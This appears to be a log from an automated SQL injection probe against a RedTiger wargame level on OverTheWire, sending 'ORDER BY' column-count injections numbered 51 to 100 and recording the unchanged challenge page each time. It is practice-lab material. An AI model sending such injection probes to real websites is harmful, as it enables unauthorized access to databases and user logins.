+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+51%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+52%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+53%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+54%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+55%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+56%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+57%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+58%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+59%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+60%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+61%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+62%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+63%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+64%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+65%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+66%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+67%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+68%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+69%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+70%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+71%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+72%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+73%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+74%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+75%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+76%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+77%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+78%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+79%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+80%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+81%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+82%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+83%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+84%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+85%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+86%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+87%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+88%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+89%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+90%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+91%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+92%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+93%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+94%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+95%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+96%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+97%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+98%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+99%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+100%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
